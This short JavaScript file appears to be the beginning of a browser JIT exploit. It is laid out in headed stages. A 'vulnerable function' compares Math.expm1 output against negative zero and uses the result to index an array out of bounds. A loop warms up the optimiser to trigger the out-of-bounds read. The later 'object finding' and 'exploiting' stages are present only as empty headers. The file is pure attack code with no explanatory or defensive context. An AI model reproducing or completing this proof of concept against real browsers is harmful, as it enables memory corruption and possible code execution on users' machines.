/* ========== BEGIN Vulnerable Function ======== */
function foo(x) {
    let a = [0.1, 0.2, 0.3, 0.4];
    let o = {mz: -0};
    let b = Object.is(Math.expm1(x), o.mz);
    return a[b * 1337];
}

/*
function foo(x) {
    return Object.is(Math.expm1(x), -0);
}
*/

/* ========== BEGIN Error Triggering =========== */
foo("0");
for(let i = 0; i < 100000; i++)
    foo("0");
console.log(foo(-0));

/* ========== BEGIN Object Finding =========== */

/* ========== BEGIN Exploiting =========== */
